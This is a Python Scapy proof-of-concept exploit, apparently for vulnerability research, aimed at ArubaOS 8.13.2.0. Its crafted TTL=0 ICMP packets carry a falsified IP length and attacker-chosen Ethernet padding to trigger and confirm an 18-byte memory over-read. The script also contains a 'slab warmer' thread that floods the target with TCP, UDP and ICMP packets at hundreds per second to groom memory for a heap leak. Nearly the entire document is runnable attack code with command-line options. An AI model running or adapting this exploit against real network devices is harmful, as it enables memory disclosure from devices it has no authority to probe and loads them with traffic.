#!/usr/bin/env python3
"""
Ghost Leak PoC v5 — Controlled Ethernet Padding Edition
ArubaOS 8.13.2.0 — CWE-126/CWE-1284

Usage:
  sudo python3 ghost_leak_v5.py --target <IP> --iface <NIC>
  sudo python3 ghost_leak_v5.py --target <IP> --iface <NIC> --warm
  sudo python3 ghost_leak_v5.py --target <IP> --iface <NIC> --no-primer --no-pad

Changes from v4:
  KEY FIX — Controlled Ethernet Padding:
  
  Frame math:
    Ethernet header : 14B
    IP header       : 20B  (ip.len=46 claimed)
    ICMP header     :  8B
    Actual total    : 42B  → below 60B minimum Ethernet frame
    Padding needed  : 18B  ← EXACTLY equals the 18B over-read region
  
  ArubaOS reads ip.len=46, computes ICMP payload = 46-20-8 = 18B,
  and copies those 18B from the received frame — which are the
  Ethernet padding bytes we control.

  v1-v4 used Scapy default padding = 0x00 → reply always zeros.
  v5 sets padding to 0xBB → if ArubaOS echoes 0xBB, over-read proven
  beyond any "zeros = no leak" argument.

  --pad-byte: customize padding byte (default 0xBB).
  --no-pad:   revert to zero padding (v4 behaviour).

Vulnerability:
  IP Total Length field trusted without frame size validation.
  TTL=0 packets processed in violation of RFC 791 Section 3.2.

Evidence criteria:
  ip.len=46 in reply              → 18B over-read confirmed
  payload == 0xBB * 18            → controlled padding echoed back
                                    = over-read of attacker-controlled data
  payload all zeros               → padding stripped by NIC (physical hw)
                                    or --no-pad mode
"""
import argparse, time, threading
from scapy.all import IP, ICMP, TCP, UDP, Raw, Ether, Padding, srp1, send, conf

PRIMER_BYTE  = 0xAA
PRIMER_LEN   = 18
GHOST_ID     = 0xDEAD
PRIMER_ID    = 0xBEEF

# Warmer signature bytes
WARM_TCP  = 0xCC
WARM_UDP  = 0xDD
WARM_ICMP = 0xEE
WARM_BYTES = {WARM_TCP, WARM_UDP, WARM_ICMP}

# Ethernet minimum frame size (excl. FCS)
ETH_MIN    = 60
ETH_HEADER = 14
IP_HEADER  = 20
ICMP_HEADER = 8
ACTUAL_FRAME = ETH_HEADER + IP_HEADER + ICMP_HEADER  # 42B
PAD_LEN    = ETH_MIN - ACTUAL_FRAME                  # 18B


# ─── Slab Warmer ────────────────────────────────────────────────────────────

class SlabWarmer(threading.Thread):
    def __init__(self, target, iface, rate=500):
        super().__init__(daemon=True)
        self.target  = target
        self.iface   = iface
        self.rate    = rate
        self.sent    = 0
        self._stop   = threading.Event()

    def run(self):
        delay = 1.0 / self.rate if self.rate > 0 else 0
        while not self._stop.is_set():
            send(IP(dst=self.target) / TCP(dport=443, flags='S') /
                 Raw(load=bytes([WARM_TCP] * 32)),
                 iface=self.iface, verbose=0)
            send(IP(dst=self.target) / UDP(dport=53) /
                 Raw(load=bytes([WARM_UDP] * 48)),
                 iface=self.iface, verbose=0)
            send(IP(dst=self.target) / ICMP(type=8) /
                 Raw(load=bytes([WARM_ICMP] * 24)),
                 iface=self.iface, verbose=0)
            self.sent += 3
            if delay:
                time.sleep(delay)

    def stop(self):
        self._stop.set()


# ─── Core ──────────────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument('--target',        required=True)
    p.add_argument('--iface',         default='eth0')
    p.add_argument('--rounds',        type=int,   default=27)
    p.add_argument('--delay',         type=float, default=0.05)
    p.add_argument('--no-primer',     action='store_true')
    p.add_argument('--no-pad',        action='store_true',
                   help='Use zero padding (v4 behaviour)')
    p.add_argument('--pad-byte',      type=lambda x: int(x, 0), default=0xBB,
                   help='Padding byte value (default: 0xBB)')
    p.add_argument('--warm',          action='store_true')
    p.add_argument('--warm-duration', type=int,   default=2)
    p.add_argument('--warm-rate',     type=int,   default=500)
    return p.parse_args()


def send_primer(target, iface, seq):
    pkt = (Ether() /
           IP(dst=target, ttl=64) /
           ICMP(type=8, code=0, id=PRIMER_ID, seq=seq) /
           Raw(load=bytes([PRIMER_BYTE] * PRIMER_LEN)))
    srp1(pkt, iface=iface, timeout=1, verbose=0)


def send_ghost(target, iface, seq, pad_byte=0xBB, use_pad=True):
    """
    Ghost packet with controlled Ethernet padding.

    Frame layout on wire:
      [Eth 14B][IP 20B, len=46, ttl=0][ICMP 8B][PAD 18B]
                                                ^^^^^^^^^
                                         ArubaOS over-reads this region.
                                         We fill it with pad_byte.
    """
    pad = bytes([pad_byte] * PAD_LEN) if use_pad else bytes(PAD_LEN)

    pkt = (Ether() /
           IP(dst=target, len=46, ttl=0) /
           ICMP(type=8, code=0, id=GHOST_ID, seq=seq) /
           Padding(load=pad))

    return srp1(pkt, iface=iface, timeout=2, verbose=0)


def classify_payload(payload, pad_byte, primer_active, warm_active):
    if not payload:
        return "empty", "no payload"

    nonzero   = sum(1 for b in payload if b != 0)
    pad_hits  = sum(1 for b in payload if b == pad_byte)
    aa_hits   = sum(1 for b in payload if b == PRIMER_BYTE)
    warm_hits = sum(1 for b in payload if b in WARM_BYTES)

    if nonzero == 0:
        return "cold", f"zeros (padding stripped by NIC, or --no-pad)"

    tags = []
    if pad_hits == PAD_LEN:
        tags.append(f"*** CONTROLLED PADDING ECHOED: {pad_hits}B = 0x{pad_byte:02X} ***")
    elif pad_hits > 0:
        tags.append(f"PARTIAL PAD: {pad_hits}/{PAD_LEN}B = 0x{pad_byte:02X}")
    if aa_hits:
        tags.append(f"PRIMER(0xAA)×{aa_hits}")
    if warm_hits:
        tags.append(f"WARM×{warm_hits}")
    other = nonzero - pad_hits - aa_hits - warm_hits
    if other:
        tags.append(f"OTHER×{other} [{payload.hex()}]")

    kind = "pad_full" if pad_hits == PAD_LEN else ("pad_partial" if pad_hits else "other")
    return kind, " | ".join(tags)


def analyse_reply(reply, pad_byte, primer_active, warm_active):
    if reply is None:
        return False, "cold", "NO REPLY — TTL=0 correctly discarded"
    if ICMP not in reply or reply[ICMP].type != 0:
        return False, "err", "Unexpected reply type"

    rep_len = reply[IP].len
    payload = bytes(reply[ICMP].payload)

    if rep_len != 46:
        return False, "err", f"ip.len={rep_len} — NOT echoed back"

    kind, detail = classify_payload(payload, pad_byte, primer_active, warm_active)
    return True, kind, f"CONFIRMED ip.len={rep_len} payload={len(payload)}B | {detail}"


def main():
    args   = parse_args()
    conf.verb = 0
    primer_active = not args.no_primer
    use_pad       = not args.no_pad

    warmer = None
    if args.warm:
        warmer = SlabWarmer(args.target, args.iface, rate=args.warm_rate)
        warmer.start()

    pad_desc = (f"0x{args.pad_byte:02X} × {PAD_LEN}B → ArubaOS will echo this"
                if use_pad else "DISABLED (zeros)")

    print(f"""
{'='*65}
 Ghost Leak PoC v5 — Controlled Ethernet Padding
 Target:        {args.target}
 Interface:     {args.iface}
 Rounds:        {args.rounds}
 Primer:        {'ENABLED (0xAA×18)' if primer_active else 'DISABLED'}
 Eth padding:   {pad_desc}
 Slab warmer:   {'ENABLED @ ' + str(args.warm_rate) + ' pps' if args.warm else 'DISABLED'}
 
 Frame layout:  [Eth 14B][IP 20B len=46 ttl=0][ICMP 8B][PAD {PAD_LEN}B=0x{args.pad_byte:02X}]
                                                                 ^^^^^^^^^^^^^^^^^
                                                    ArubaOS over-reads exactly this region
{'='*65}
""")

    if warmer:
        print(f"  [*] Pre-warming slab for {args.warm_duration}s ...")
        time.sleep(args.warm_duration)
        print(f"  [*] Ready (~{warmer.sent} warm pkts). Starting ghost rounds.\n")

    confirmed     = 0
    failed        = 0
    pad_echoed    = 0
    pad_partial   = 0

    for i in range(args.rounds):
        if primer_active:
            send_primer(args.target, args.iface, i)
            time.sleep(args.delay)

        reply = send_ghost(args.target, args.iface, i,
                           pad_byte=args.pad_byte, use_pad=use_pad)
        ok, kind, status = analyse_reply(reply, args.pad_byte,
                                         primer_active, args.warm)
        if ok:
            confirmed += 1
            if kind == "pad_full":    pad_echoed  += 1
            elif kind == "pad_partial": pad_partial += 1
        else:
            failed += 1

        print(f"  [{i:3d}] {status}")

    if warmer:
        warmer.stop()
        print(f"\n  [*] Warmer stopped. Total warm packets: {warmer.sent}")

    print(f"""
{'='*65}
 RESULTS
{'='*65}
  Rounds sent:          {args.rounds}
  Confirmed (ip.len=46):{confirmed}
  Padding echoed (full):{pad_echoed}   ← controlled bytes in reply
  Padding echoed (part):{pad_partial}
  No reply / error:     {failed}
""")

    if confirmed > 0:
        print("  VULNERABILITY CONFIRMED:")
        print("  ArubaOS processed TTL=0 ICMP and echoed ip.len=46")
        print("  for packets with 28B actual IP data → 18B over-read.")
        print("  RFC 791 / RFC 1122 Section 3.2.1.7 violated.")
        if pad_echoed > 0:
            print(f"""
  *** CONTROLLED PADDING ECHOED ({pad_echoed}/{confirmed} rounds) ***
  ArubaOS echoed back attacker-controlled Ethernet padding bytes
  (0x{args.pad_byte:02X} × {PAD_LEN}B) in the ICMP reply payload field.

  Root cause confirmed:
    ip.len=46 trusted → 18B read beyond ICMP header
    → Ethernet frame padding region (attacker-controlled)
    → Echoed verbatim in reply

  On physical hardware with NIC padding-strip:
    These 18B = sk_buff uninitialized memory → actual heap/memory leak.

  "Zeros = no vulnerability" argument is invalidated:
    Zeros are Scapy default padding, not absence of over-read.
    This test proves the read occurs regardless of content.
""")
        else:
            print(f"""
  Note: Reply payload = zeros.
  Possible causes:
    1. Physical NIC stripped Ethernet padding before DMA → sk_buff
       region was freshly allocated (zero) — vuln still present
    2. ArubaOS zeroed reply buffer before copy (unlikely given prior results)
  
  Over-read is proven by ip.len=46 in reply regardless of payload content.
  Use --pad-byte 0xCC or different value to vary the test.
""")
    else:
        print("  NOT CONFIRMED — TTL=0 discarded or ip.len not echoed.")

    print('='*65)


if __name__ == '__main__':
    main()
